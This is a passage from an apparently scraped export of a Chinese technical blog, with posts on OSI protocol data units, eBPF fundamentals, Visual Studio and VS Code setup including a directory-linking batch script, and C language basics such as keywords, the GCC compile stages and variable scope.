Microservice-Aware with Cilium and eBPF\n[6] Network Stack Chapter13\n","permalink":"https://www.oomkill.com/2022/10/network-stack/","summary":"","title":"Linux网络栈"},{"content":"Overview [1] 协议数据单元 Protocol Data Unit (PDU) 是应用于OSI模型中的数据结构，在OSI模型中每一层都会被添加一个header，tailer进行封装，header, tailer加原始报文的组合就是PDU。\n在每层中，PDU的名称都是不同的，这也是很多人的疑问，一会数据报文称为数据包，一会数据报文成为数据帧，该文介绍网络中的单元，以了解之间的区别\n物理层 物理层数据的呈现方式是以 “位” (bit) 为单位的，即0 1，在该层中数据以二进制形式进行传输\n数据链路层 [2] 到达数据链路层，实际上可以说进入了TCP/IP栈对底层，而该层的单位为 ”帧“ (frame)，该层中，MAC地址会被封装到数据包中，比如以太网帧，PPP帧都是指该层的数据包\n该层中数据帧包含：\n源MAC 目的MAC 数据，由网络层给出的 数据的总长度 校验序列 网络层 [3] 在网络层中协议数据单元被称为数据 “包\u0026quot; (package) ，是网络间节点通讯的基本单位。该层中IP地址会被封装到数据包内。\n该层中数据包包含：\n标头：源IP，目的IP，协议，数据包编号，帮助数据包匹配网络的位 payload：数据包的主体 标尾：包含几个位，用于告知已到达数据包的末尾与错误检查（循环冗余检查 (CRC)） 图：数据包组成 Source：https://computer.howstuffworks.com/question525.htm\n例如一个电子邮件，假设电子邮件大小尾3500bit，发送时使用1024的固定大小数据包进行发送，那么每个数据包标头为 96bits，标尾为 32bit，剩余 896bits 将用于实际的数据大小。这里为3500bits，会被分为4个数据包，前三个数据包为 896bits，最后一个数据包大小为 812bits。接收端会根据包编号进行解包重组\n传输层 Segment 在传输层TCP协议的协议数据单元被称为 ”段“ (Segment) ，上面讲到，IP数据包会以固定大小的数据包进行发送，如果超出大小的会被划分为多个数据包，每个数据包的碎片就被称之为Segment。\n数据包分割通常会发生在该层，当发生下列场景时会需要分段\n数据包大于网络支持的最大传输单元 (MTU) 网络不可靠，将数据包分为更小的包 datagram [4] 在传输层UDP协议的协议数据单元被称为 ”数据报“ (datagram) ，datagram是一种逐层增加的设计，用于无连接通讯\n下图是一个UDP数据报被封装位一个IP数据包：IPv4字段值位17 表示udp协议\n图：udp的IP包 Source：https://notes.shichao.io/tcpv1/ch10\n对于udp数据报的组成包含header与payload，udp的header大小为固定的8字节\n源端口：可选 目的端口：识别接收信息的进程 Length：udp header + udp payload的长度，最小值为8 checksum：与lenght一样其实是多余的，因为第三层包含了这两个信息 图：udp数据报组成 Source：https://notes.shichao.io/tcpv1/ch10\nNotes：使用UDP时应注意避免分段，例如帧中MTU为 1500 字节，假设 IPv4 header为 20 字节，UDP header 为 8 字节，则应用程序最多为数据留下 1472 字节以避免碎片\n数据 对于传输层之上，协议数据单元没有特定的名词，可以统称为协议数据单元或者数据，整个PDU分层结构图如下图所示，其中 T 表示 Trailer，H 表示 Header，通常H包含源地址和目的地址及一些用于管理通信的控制信息。T含错误检查之类的信息或标志 PDU 结束的字段。\n图：PDU分层结构图 Source：http://www.telecomworld101.com/Intro2dcRev2/page108.html\nNotes：每层的数据字段都由上一层PDU组成，通常情况下，每层只知道自己该层的信息，如网络层仅知道对端网络层，而不知道数据链路层或传输层\nReference [1] Protocol Data Unit\n[2] difference between segments packets and frames\n[3] What is a packet?\n[4] User Datagram Protocol (UDP) and IP Fragmentation\n","permalink":"https://www.oomkill.com/2022/10/network-unit-in-osi/","summary":"","title":"为什么网络是分层的"},{"content":"eBPF介绍 eBPF是 Extended Berkeley Packet Filter，主要是用于包过滤的。为什么叫Berkeley Packet Filter 是因为论文出自 Lawrence Berkeley Laboratory（相对的论文可以参考 [1]）。“E\u0026quot; 是使BPF不仅仅是包过滤。\neBPF 目前提供的功能不仅仅是包过滤，它是一个允许用户在操作系统内核加载自定义程序的框架，来自于 ”What Is eBPF?“\neBPF is a framework that allows users to load and run custom programs within the kernel of the operating system. That means it can extend or even modify the way the kernel behaves. [2]\neBPF验证器\n对于如果想改变Linux内核功能需要合并代码到内核或者编写内核模块。前者需要被社区接受，这需要很长一个周期；而后者可以很好的扩展内核功能，但都存在一个问题 ”==安全运行==“\n”安全运行“ 问题包含”漏洞“和“崩溃”，考虑到这些，eBPF为安全运行提供了一个非常不同的方法**：eBPF verifier** ，eBPF verifier 将确保应用只能够在安全情况下被运行。\neBPF verifier 保证了 eBPF 程序运行的 ”安全“ 和 ”验证“\n”验证“ (Verification) 是指对程序进行分析，确保无论输入时什么，都会在有限的之阵内终止。例如在解除指针时，确保指针不是空置，解除对指针引用意味着将会 “查找这个地址的值”，解引用空置，会程序崩溃，而在内核中空指针会引起整个机器崩溃。\n”安全“ (Security)是指将确保eBPF程序运行时安全的，这种场景将限制eBPF访问的内存为只能被访问的内存。例如，有一个 eBPF 程序出发在一个网络stack上，并通过内核的socket buffer，包括正在传输的数据。这里有一些特殊的辅助函数，例如 bpf_skb_load_bytes()，这个 eBPF 程序可以从套接字缓冲区中读取字节数据。与此同时，另一个由系统调用触发的 eBPF 程序，没有可用的套接字缓冲区，将不允许使用这个辅助函数（what is eBPF chapter2 [2]）。\neBPF的动态加载\n上面也提到了eBPF是一个允许用户自定义程序加载内核功能的框架，也就意味着使用内核无需对内核代码的改变，what is eBPF chapter2 中提到的eBPF动态加载，可以理解为触发器与事件，eBFP可以使程序可以动态地加载到内核中和从内核中删除。当附加到事件上的程序遇到对应事件时就会被触发。\neBPF程序\neBPF是事件驱动型程序，它允许在内核中，并挂在到对应的挂载点上，当发生系统调用，函数的进入/退出，内核tracepoints，网络事件等发生，将触发对应程序的操作。\neBPF包含两部分，eBPF程序，eBPF工具\neBPF程序，只运行在内核空间内的代码，这部分仅可以用C或者Rust编写，目前eBPF使用的C语言编写\neBPF工具，是指运行在用户空间内的代码，这部分可以使用任意编程语言编写，例如Python, Go, C 等。\n探针\n探针 (probes) 是指内核定义的扩展点，可以通过eBPF程序将其附加到对应的扩展点上。常用的有kprobe 与 uprobe\nkprobe 是跟踪内核函数调用的探针（k是kernel的前缀），例如 execve() kprobe 是跟踪用户空间程序调用的探针，例如对运行程序 nginx 状态的跟踪 程序的加载\n用户空间的程序在 eBPF验证器的允许下，可以使用 bpf() 系统调用从 ELF 文件中加载 eBPF程序到内核中；一旦将程序加载到内核时，就必须绑定到对应的 ”事件“ 上，每当事件发生时，对应的eBPF程序就会被触发。下面宝海一些常用的事件：\n函数的进入进出 Tracepoints，是Linux内核中定义的一些hook可以将 eBPF 程序附加到内核内定义的 tracepoints 中 Perf 是一个收集性能数据的子系统。可以将 eBPF 程序挂到所有收集 perf 数据的地方 Linux的安全模块 LSM 例如 SELinux 和 APPAmor 使用他们的接口，通过eBPF，可以将程序附加到对应的检查点上。 网络接口，eXpress Data Path (XDP) 允许将eBPF程序附加到网络接口上，当收到包时，会触发对应的事件，事件可以检查或者改变一个数据包。 套接字和网络钩子，当应用程序在网络套接字上打开或执行其他操作时，以及发出或收到数据包时，你可以附加运行eBPF程序。在内核网络stack中也被叫做 traffic control (TC)。 eBPF MAP\n在一些情况下，我们希望eBPF是从用户空间的应用来接收信息，或者将数据传递给用户空间的应用，允许eBPF程序与用户空间之间传递数据，或者不同的eBPF程序间传递数据的机制被称为 MAP\nMAP 是数据类型，本质上是一个 key-value 的存储，用于存储不同类型数据的通用数据结构。允许不同eBPF程序之间以及内核和用户空间应用程序之间共享数据。\nMAP用途：\n存储数据，供多eBPF程序信息协调 eBPF写入事件或指标供用户空间程序检索 用户空间配置，供eBPF程序读取并作出相应行为 eBPF在云原生 在kubernetes中，运行在机器上的Pod共享一个内核，可以通过eBPF检测该机器上运行的应用程序，将eBPF加载到内核并附加到事件之上，就会触发相关事件，而不需要考虑进程与事件的关系。\neBPF 与 sidecar\n传统的可观测性应用都使用了 sidecar 方式进行部署的，这种模式是单独部署一个与应用相同的程序到pod中。\nsidecar 模式的两大缺点：\n浪费资源**：sidecar** 容器都会消耗大量资源，取决于注入的数量 安全运行：不能确保每个运行的Pod都被注入 eBPF的隔离\neBPF 检查器可以确保 eBPF 程序只能访问它有权限的内存。检查器检查程序时不可能超出其职权范围，包括确保内存为当前进程所拥有或为当前网络包的一部分。这意味着 eBPF 代码比它周围的内核代码受到更严格的控制，内核代码不需要通过任何类型的检查器。当遇到攻击者通过容器化的应用程序部署到节点上，并且可以提权，那么该攻击程序就可以危害到同一节点上的其他应用程序。当然eBPF检查器可以避免这个问题。\neBPF的应用\neBPF 官网 ebpf.io 中介绍，在通常情况下eBPF不会被单独使用而是通过其他项目在eBPF之上提供一个用户空间工具进行使用，例如 Cilium, bcc等。\neBPF工具\n通常情况下eBPF工具都是围绕 网络(networking) ，可观测性(observability) ，安全 (security） 这三个重要方面使用eBPF功能的。\neBPF程序可以连接到网络接口和内核的网络堆栈的各个点（可以通过tracepoint实现）。在每个追踪点上，eBPF程序都可以选择接收/丢弃/操作数据包。基于这个条件下eBPF就可以实现很强大的网络功能，常见的eBPF 实现的网络功能有 负载均衡，分布式防火墙，cni。\nKatran L4 LoadBalancer, facebook开源的4层负载均衡器，使用的eBPF与C++结合的技术 Cilium eBPF Kubernetes 网络插件 eBPF Tools\nBCC\nBCC (BPF Compiler Collection) 是一组基于eBPF技术用于分析操作系统和网络性能的一组工具。主要提供了以下功能\n用于观测/追踪 在运行的Linux系统状态工具 对于 如何编写eBPF程序 eBPF 程序可以用受限的 C 来编写，使用 clang 编译器编译成 eBPF 字节码。\nNotes: 受限 C 语言是指省略了一些特性，例如循环，全局变量，可变参数函数，浮点数以及作为函数参数传递的结构。\nGo使用 libbpfgo 会包装 libbpf （一个C语言实现的系统调用库） 的系统调用 BPF() 函数，通过加载BPF对象（是通过C语言编写的BPF函数）然后绑定到对应的事件上。\neBPF程序必须使用C编写，通过clang编译为BPF code，然后Go/Python等代码去读取这个文件 xxx.o 将其插入到内核中。所以通常情况下，我们会看到是一个Go/Python或者其他语言来包裹C代码来运行的。\n一个eBPF程序的结构如下图所示，包含两部分，在用户空间运行的应用程序与运行在内核空间的eBPF程序，用户空间的应用通过系统调用 BPF() 来调用运行在内核空间内的eBPF程序的函数。\n图：eBPF program structure Source：https://files.gotocon.com/uploads/slides/conference_39/1688/original/Beginners%20guide%20to%20eBPF%20with%20Go.pdf\neBPF的加载过程如下图所示\n图：eBPF program loading flow Source：https://files.gotocon.com/uploads/slides/conference_39/1688/original/Beginners%20guide%20to%20eBPF%20with%20Go.pdf\n一个 eBPF obj 代码在用户空间通过 bpf() 系统调用加载到内核中；在内核中首先需要验证器确保eBPF程序是可以安全运行的，如果可以安全运行，将开始在BPF 虚拟机中开始运行\n图：eBPF program lifetime Source：https://files.gotocon.com/uploads/slides/conference_39/1688/original/Beginners%20guide%20to%20eBPF%20with%20Go.pdf\nhttps://github.com/iovisor/bcc/blob/master/docs/reference_guide.md#data\nhttps://man7.org/linux/man-pages/man7/bpf-helpers.7.html\nhttps://gitlab.epfl.ch/debeule/bpf/-/blob/master/LOG.md\nhttps://github.com/lizrice/learning-ebpf/blob/main/chapter5/hello.bpf.c\nhttps://medium.com/@phylake/bottom-up-ebpf-d7ca9cbe8321\nReference [1] The BSD Packet Filter\n[2] What Is eBPF?\n[3] how are ebpf programs written\nhttps://www.youtube.com/watch?v=uBqRv8bDroc\n","permalink":"https://www.oomkill.com/2022/10/what-is-ebpf/","summary":"","title":"科普ebpf"},{"content":"Visual Studio使用 离线安装包 在页面 [4] 下载安装引导命令，下载完成后使用命令（对于C++来说）\nvs_Professional.exe --layout ‪1111 --add Microsoft.VisualStudio.Workload.NativeDesktop --includeRecommended --lang en-US zh-CN 随后会触发下载，等待下载完成后，在 --layout 指定的目录上点击 vs_setup 开始离线安装。\nNote: 对于完全脱离C盘安装可以使用下面的脚本，更改变量为要安装的路径\n:: 关闭终端回显 @echo off SET ROOT_PATH=D:\\Program Files\\Microsoft Visual Studio SET X86_PATH=%ROOT_PATH%\\Program Files (x86) SET X86_VS_PATH=%X86_PATH%\\Microsoft Visual Studio SET X86_SDK_PATH=%X86_PATH%\\Microsoft SDKs SET X86_KITS_PATH=%X86_PATH%\\Windows Kits SET X86_AV_PATH=%X86_PATH%\\Application Verifier SET X64_PATH=%ROOT_PATH%\\Program Files rem SET X64_VS_PATH=%X64_PATH%\\Microsoft Visual Studio SET X64_AV_PATH=%X64_PATH%\\Application Verifier SET X64_SQL_PATH=%X64_PATH%\\Microsoft SQL Server SET PD_PATH=%ROOT_PATH%\\ProgramData SET PD_VS_PATH=%PD_PATH%\\Microsoft\\VisualStudio SET PD_PC_PATH=%PD_PATH%\\Package Cache @echo =======link directory to %ROOT_PATH%=======: SET S_X86_SKD_PATH=C:\\Program Files (x86)\\Microsoft SDKs SET S_X86_VS_PATH=C:\\Program Files (x86)\\Microsoft Visual Studio SET S_X86_KITS_PATH=C:\\Program Files (x86)\\Windows Kits SET S_X86_AV_PATH=C:\\Program Files (x86)\\Application Verifier SET S_X64_AV_PATH=C:\\Program Files\\Application Verifier SET S_X64_SQL_PATH=C:\\Program Files\\Microsoft SQL Server SET S_PD_VS_PATH=C:\\ProgramData\\Microsoft\\VisualStudio SET S_PD_PC_PATH=C:\\ProgramData\\Package Cache pause @echo =======setting visual studio environment=======: @echo =======check directory exist=======: if not exist %ROOT_PATH% ( echo \u0026quot;%ROOT_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%ROOT_PATH%\u0026quot; ) if not exist %X86_PATH% ( echo \u0026quot;%X86_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X86_PATH%\u0026quot; ) if not exist %X86_VS_PATH% ( echo \u0026quot;%X86_VS_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X86_VS_PATH%\u0026quot; ) if not exist %X86_SDK_PATH% ( echo \u0026quot;%X86_SDK_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X86_SDK_PATH%\u0026quot; ) if not exist %X86_KITS_PATH% ( echo \u0026quot;%X86_KITS_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X86_KITS_PATH%\u0026quot; ) if not exist %X86_AV_PATH% ( echo \u0026quot;%X86_AV_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X86_AV_PATH%\u0026quot; ) if not exist %X64_PATH% ( echo \u0026quot;%X64_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X64_PATH%\u0026quot; ) if not exist %X64_AV_PATH% ( echo \u0026quot;%X64_AV_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X64_AV_PATH%\u0026quot; ) if not exist %X64_SQL_PATH% ( echo \u0026quot;%X64_SQL_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%X64_SQL_PATH%\u0026quot; ) if not exist %PD_PATH% ( echo \u0026quot;%PD_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%PD_PATH%\u0026quot; ) if not exist %PD_VS_PATH% ( echo \u0026quot;%PD_VS_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%PD_VS_PATH%\u0026quot; ) if not exist %PD_PC_PATH% ( echo \u0026quot;%PD_PC_PATH%目录不存在，已创建该目录！\u0026quot; md \u0026quot;%PD_PC_PATH%\u0026quot; ) @echo =======link directory to %ROOT_PATH%=======: :: x86 link mklink /j \u0026quot;%S_X86_SKD_PATH%\u0026quot; \u0026quot;%X86_SDK_PATH%\u0026quot; mklink /j \u0026quot;%S_X86_VS_PATH%\u0026quot; \u0026quot;%X86_VS_PATH%\u0026quot; mklink /j \u0026quot;%S_X86_KITS_PATH%\u0026quot; \u0026quot;%X86_KITS_PATH%\u0026quot; mklink /j \u0026quot;%S_X86_AV_PATH%\u0026quot; \u0026quot;%X86_AV_PATH%\u0026quot; :: x64 link mklink /j \u0026quot;%S_X64_AV_PATH%\u0026quot; \u0026quot;%X64_AV_PATH%\u0026quot; mklink /j \u0026quot;%S_X64_SQL_PATH%\u0026quot; \u0026quot;%X64_SQL_PATH%\u0026quot; :: ProgramData link mklink /j \u0026quot;%S_PD_VS_PATH%\u0026quot; \u0026quot;%PD_VS_PATH%\u0026quot; mklink /j \u0026quot;%S_PD_PC_PATH%\u0026quot; \u0026quot;%PD_PC_PATH%\u0026quot; pause VS快捷键 快捷键 含义 Ctrl + k,Ctrl + f 自动格式化代码 Ctrl + k,Ctrl + c 注释代码 Ctrl + k,Ctrl + u 取消注释代码 F9 设置断点 F5 调试运行 Ctrl + F5 不调试运行 Ctrl + Shift + b 编译，不运行 F10 next调试 F11 step调试 调试 添加行号：工具\u0026ndash;》选项 \u0026ndash;》文本编辑器\u0026ndash;》C/C++ \u0026ndash;》行号\n调试步骤\n设置断点。F5启动调试 停止（断点处）的位置，是尚未执行的指令。 逐语句执行一下条 （F11）：进入函数内部，逐条执行跟踪。 逐过程执行一下条 （F10）：不进入函数内部，逐条执行程序。 监视：调试 \u0026ndash;》窗口 \u0026ndash;》监视：输入监视变量名。自动监视变量值的变化。 VS Code使用 安装扩展 C/C++ Extension Pack，Code Runner\n调试相关快捷键：\nF5 进入调试 F9 切换断点 F10 单步跳过（逐过程执行） F11 单步执行（逐语句执行，可进入执行函数体） Shift+F5 停止调试 Ctrl+Shift+F5重启调试 Ctrl+F5 开始执行，不进入断点 Ctrl+F9 启用/停止断点 Ctrl+Shift+F9 删除全部断点 Ctrl+b 隐藏/打开侧边框 Ctrl+` 隐藏/打开terminal Ctrl+j 隐藏/打开下边框（plannel） Ctrl+Shift+D 打开侧边框 Run and Debug Ctrl+Shift+E 打开侧边框 Explorer Ctrl+Alt+N run code 配置 launch.json 根据提示，替换gcc路径即可\n// 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 \u0026quot;version\u0026quot;: \u0026quot;0.2.0\u0026quot;, \u0026quot;configurations\u0026quot;: [ { \u0026quot;name\u0026quot;: \u0026quot;gcc.exe - 生成和调试活动文件\u0026quot;, \u0026quot;type\u0026quot;: \u0026quot;cppdbg\u0026quot;, \u0026quot;request\u0026quot;: \u0026quot;launch\u0026quot;, \u0026quot;program\u0026quot;: \u0026quot;${fileDirname}\\\\${fileBasenameNoExtension}.exe\u0026quot;, \u0026quot;args\u0026quot;: [], \u0026quot;stopAtEntry\u0026quot;: false, \u0026quot;cwd\u0026quot;: \u0026quot;${workspaceFolder}\u0026quot;, \u0026quot;environment\u0026quot;: [], \u0026quot;externalConsole\u0026quot;: false, \u0026quot;MIMode\u0026quot;: \u0026quot;gdb\u0026quot;, \u0026quot;miDebuggerPath\u0026quot;: \u0026quot;D:\\Program Files\\mingw64\\bin\\gdb.exe\u0026quot;, \u0026quot;setupCommands\u0026quot;: [ { \u0026quot;description\u0026quot;: \u0026quot;为 gdb 启用整齐打印\u0026quot;, \u0026quot;text\u0026quot;: \u0026quot;-enable-pretty-printing\u0026quot;, \u0026quot;ignoreFailures\u0026quot;: true } ], \u0026quot;preLaunchTask\u0026quot;: \u0026quot;C/C++: gcc.exe build active file\u0026quot; } ] } ","permalink":"https://www.oomkill.com/2022/09/ch0-ide/","summary":"","title":"ch0 ide"},{"content":"C语言关键字 [1] ==C语言有32个关键字==\nauto：定义自动变量，主要是声明变量的生存周期 break, continue : break 语句在遇到最内层循环时立即终止。还用于终止 switch 语句。 case, switch, default：使用 switch 和 case 语句声明一个switch分支 char：用于声明character 类型的变量 const：声明常量 do\u0026hellip;while： double： double-precision 浮点数变量类型 float：single-precision 浮点数的变量类型 if, else：声明if/else 条件判断 enum：用于声明枚举类型 extern：关键字声明变量或函数在其声明的文件之外具有外部链接。 for：C 语言的三种循环之一，for循环 goto： 用于将程序的控制权转移到指定的标签 int：声明 integer 类型的变量 short, long, signed, unsigned：是类型修饰符，它们改变基本数据类型的含义以产生新类型。 short int： -32768 to 32767 long int： -2147483648 to 214743648 signed int： -32768 to 32767 unsigned int： 0 to 65535 return： 终止函数并返回值 sizeof：评估变量或常量的大小 register：创建比普通变量快得多的寄存器变量。 static：创建一个静态变量。静态变量的值持续到程序结束。 struct：用于声明结构体。结构体可以包含不同类型的变量。 typedef：用于将类型与标识符显式关联。 union：用于将不同类型的变量分组在一个名称下。 void：没有任何意义，函数修饰为没有返回值，参数修饰为没有参数 volatile：提醒编译器它后面所定义的变量随时都有可能改变 C语言控制语句 ==C语言有9种控制语句== (control statements)\nIf..else for while do..while continue break switch goto return C语言运算符 [2] ==C语言有45种运算符== (operator)\n算数运算符 (Arithmetic Operators) ：+, -，*，/，% 赋值运算符 (Assignment Operators) ：=，+=，-=，*=，/=，%= 关系运算符 (Relational Operators)：==，\u0026gt; ，\u0026lt;，!= ，\u0026gt;=，\u0026lt;= 逻辑运算符 (Logical Operators)：\u0026amp;\u0026amp;，||，! 位运算符 (Bitwise Operators)：\u0026amp;，|，^，~，\u0026lt;\u0026lt;，\u0026gt;\u0026gt; 逗号运算符 (Comma Operator)：链接相关表达式 ，int a, c = 5, d; sizeof运算符(sizeof operator)：一元运算符，它返回数据的大小（常量、变量、数组、结构） 杂项运算符（）：\u0026amp; 取址，* 取指针，?: 二元条件表达式 GCC编译四部曲 [3] 预处理 (Preprocessing)：在预处理步骤，将生成一个扩展名为 .i 的文件；使用命令 gcc -E file.c 操作 头文件展开，不检查语法错误，将展开所有头（include）文件（任意） 宏定义替换 删除注释 展开条件编译，根据条件来展开指令 编译 (Compilation) ：会生成一个扩展名为 .s 的文件，命令是：gcc -S file.c 检查语法错误 将文件翻译成汇编语言 汇编 (Assembler)：将汇编代码转换为纯二进制代码或机器代码（零和一）。此代码也称为目标代码；将生成一个带有 .o 扩展名的文件：gcc -c file.c 链接 (Linker)：链接是编译的最后一步。链接器将来自多个模块的所有目标代码合并为一个，如果使用了库也会引用。这个步骤也是包含前三个步骤的。gcc file.o -o hello.exe 接收由汇编步骤生成的 .o 扩展名文件 数据地址回填 数据段合并 库引入 变量 变量 (variables) 是用于存储数据的内存位置名称，可以改变的内容\n变量的命名规则 不能以数字开头 由数字、字母，甚至是下划线 (_) 等特殊符号组成 变量名不能是任何关键字 变量名中不能有空格或空白 变量名是==区分大小写的== 变量的数据类型 C 语言中数据类型主要包含以下类型\n变量类型 实际代表名称 描述 用途 char Character 代表1bytes(8bit)，是以单引号引起的字符 通常以单个字母的形式使用X、r等，或 ASCII 字符集。 int Integer 自然整数 用来存储整数，如 4, 300, 8000 \u0026hellip; float Floating- Point 单精度浮点数 表示实数值或小数值（7位小数），例如 20.8, 18.56 \u0026hellip; double Double 双精度浮点值 比float类型要大 4bytes,允许15位小数 void Void 表示没有类型。 这种数据类型是为了用于修饰没有意义函数或变量，如函数用其修饰标识没有返回值，参数用其修饰表示没有参数。 变量声明与定义 变量的定义 (Declaration)：告诉编译器应为变量创建多少存储空间或者在哪里创建存储空间（借助于数据类型） **变量声明 **(Definition)：只声明不赋值的变量叫做变量定义， int a 定义与声明的区别：\n变量定义会开辟内存空间。变量声明不会开辟内存空间 变量要想使用必须有定义 声明指示编译器存在变量，而定义表示编译器为变量创建的存储位置和存储量 变量的分类 全局变量 (global) ：在块或函数之外声明的变量称为全局变量 局部变量 (Local)：在块或函数中声明的一种变量 静态变量 (static)：使用 static 关键字声明的变量。该变量在各种函数调用之间保留给定值 自动变量 (auto)：变量具有自动存储期，程序在进入该变量声明所在的块时变量存在，程序在退出该块时变量消失 外部变量 (extren)：能够在多个源文件中共享一个变量 extern int a=10; 变量的数据大小 [6] C 编程语言有两种基本数据类型：基本与衍生\n类型 范围 大小（以字节为单位） 格式化符号 unsigned char 0 ~ 255 1 %c signed char/char -128 ~ +127 1 %c unsigned int 0 ~ 65535 2 %u signed int or int -32,768 ~ +32767 2 %d unsigned short int 0~ 65535 2 %hu signed short int/short int -32,768 ~ +32767 2 %hd unsigned long int 0 ~ +4,294,967,295 4 %lu signed long int/long int -2,147,483,648 ~ 2,147,483,647 4 %ld long long int -(2^63) to (2^63)-1 8 %lld unsigned long long int 0 to 18,446,744,073,709,551,615 8 %llu float [5] 7位精度 4 %f double [5] 15位精度 8 %lf 变量类型 C语言中根据变量的声明周期和范围可以被分为两种类型 局部变量和全局变量与静态变量\n局部变量 局部变量 (local variables) 被声明在函数内部，只要函数存在，它们就只存在于内存中，直到函数结束，局部变量就会消失！\n例如创建一个局部变量 a，a在函数运行时被创建在stack段中，当函数foo() 结束，被释放，故下列代码编译错误。\n#include \u0026lt;stdio.h\u0026gt; void\tfoo(void) { int\ta; a = 10; printf(\u0026quot;Foo function: Variable a = %d\\n\u0026quot;, a); } // the variable 'a' ceases to exist in RAM here. int\tmain(void) { foo(); printf(\u0026quot;Main: Variable a = %d\\n\u0026quot;, a); // ERROR : main does not know any variable named 'a'! return (0); } Notes：函数的参数也是局部变量，如果需要外部更改，则通过指针方式传递进去\n全局变量 全局变量 (global variables) 是指在函数外部声明的变量；全局变量随函数生命周期结束时消失，因为全局变量被存储在内存结构的data分段中，是属于二进制文件本身的。另外==默认情况下，未被赋值的全局变量会被初始化为 0==。\n#include \u0026lt;stdio.h\u0026gt; int\ta; // Global variable initialized to 0 by default void\tfoo(void) { a = 42; // Global variable accessible without // having been declared in the function printf(\u0026quot;Foo: a = %d\\n\u0026quot;, a); // a == 42 } int\tmain(void) { printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 0 foo(); printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 42 a = 200; printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 200 return (0); } Notes：局部变量的作用域高于全局变量，如果同名会被覆盖\n全局变量的作用域\n如果想在一个文件中使用另一个文件中定义的全局变量，需要使用关键字 ”extern“ 再次声明。这代表告诉编译器正在声明我们在程序文件的其他地方定义的变量。\n例如下面代码中，main.c 中，使用 extern 关键字声明全局变量，表示我们在其他地方定义了这个变量。并做了 foo() 函数原型的声明。并在 foo.c 文件中，定义了全局变量 a 及 foo() 函数\nmain.c\n#include \u0026lt;stdio.h\u0026gt; extern int\ta; // 在其他文件内定义的全局变量 void foo(void);\t// 定义在其他方面的函数，这种写法等同于extern void foo(void); int\tmain(void) { printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 100 foo(); printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 42 a = 200; printf(\u0026quot;Main: a = %d\\n\u0026quot;, a); // a == 200 return (0); } void.c\n#include \u0026lt;stdio.h\u0026gt; int\ta = 100; // 全局变量的定义 void foo(void) { a = 42; printf(\u0026quot;Foo: a = %d\\n\u0026quot;, a); // a == 42 } 输出结果为\nMain: a = 100 Foo: a = 42 Main: a = 42 Main: a = 200 也可以使用头文件来定义，这种方式比上面的更好，示例只是说明全局变量\n静态变量 静态变量是指使用关键字 “static\u0026quot; 修饰的变量，静态变量可以分为 静态全局变量 与 静态局部变量 ，静态变量默认是全局的，因为他存储的地方是data区而不是堆，栈中。\n静态变量有两点区分与全局变量：\n在函数内部定义的静态变量是这个函数的全局变量（第一个结束的括号） 在函数外声明的静态变量仅在这个声明他的文件内有效。 下面代码会编译异常，因为b生命周期存在与for循环中\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; void test() { static int a = 10; for(int i=0; i\u0026lt;10; i++) { static int b = 10; a++; b++; } printf(\u0026quot;value a is %d\\n\u0026quot;,a); printf(\u0026quot;value b is %d\\n\u0026quot;,b); } void main() { test(); } 局部静态变量 局部静态变量不能说是真正的局部变量，因为其存储内存位置与局部变量不同，局部变量存储在堆，栈中，而静态变量存储在data中只是说会被限制在对应的作用域中。\n下面代码说明了普通局部变量和静态局部变量的区别，由于存储位置不同，静态局部变量只是被访问限制在作用域中，而不会随函数结束释放掉。\n#include \u0026lt;stdio.h\u0026gt; void foo(void) { int\ta = 100; static int\tb = 100; printf(\u0026quot;a = %d, b = %d\\n\u0026quot;, a, b); a++; b++; } int\tmain(void) { foo(); foo(); foo(); foo(); foo(); return (0); } 输出结果\na = 100, b = 100 a = 100, b = 101 a = 100, b = 102 a = 100, b = 103 a = 100, b = 104 全局静态变量 全局静态变量是声明在函数外面用static修饰的变量，与全局变量不同的是，静态全局变量访问域被限制在声明它们的文件中，无法从程序的另一个文件中访问它。\n在全局变量部分，可以通过关键字 ”extern“ 来访问全局变量，如果此时声明一个静态变量 a ，那么通过跨文件的方式这时编译器会提示 ”undefined reference to ‘a\u0026rsquo;“。通常情况下使用这种场景被用于加速编译。\nglobal VS local VS static 作用域方面不同：局部变量作用域仅在 同一个 {}，而静态变量和全局变量在为整个进程 访问作用域不同：全局变量为进程共享，局部变量为函数运行时，静态全局变量为定义它的文件，静态全局变量为 同一个 {} 存储位置不同，局部变量被存储与堆，栈中，而静态变量和全局变量被存储在data中 类型转换 隐式类型转换 隐式类型 (Implicit) 转换也称自动类型转换，这种类型的转换包含如下特点：\n编译器自动完成，无需用户干预触发 当表达式中存在多种类型时触发，这是为了保证数据不被丢失 所有的数据类型都将升级为该类型最大值 转换的顺序为：bool -\u0026gt; char -\u0026gt; short int -\u0026gt; int -\u0026gt; unsigned int -\u0026gt; long -\u0026gt; unsigned -\u0026gt; long long -\u0026gt; float -\u0026gt; double -\u0026gt; long double 该转换类型会存在一些问题，如符号消失，数据丢失等。 #include\u0026lt;stdio.h\u0026gt; int main() { int x = 10; // integer x char y = 'a'; // character c // y 被隐式转换为 char类型，a=97 x = x + y; // 计算中，存在浮点数值，结果将被转换为float float z = x + 1.0; // 自动转换为long long int h = 2147483648; // int 到 short int值溢出将为23352减去int大小65536 short int g = 88888 + x; printf(\u0026quot;x = %d, z = %f\\n\u0026quot;, x, z); printf(\u0026quot;g = %li, h = %lli\\n\u0026quot;, g, h); return 0; } 显式类型转换 用户定义类型转换的过程称为显式类型转换 (Explicit)\n(type) expression 显示转换示例\n#include\u0026lt;stdio.h\u0026gt; int main() { float x = 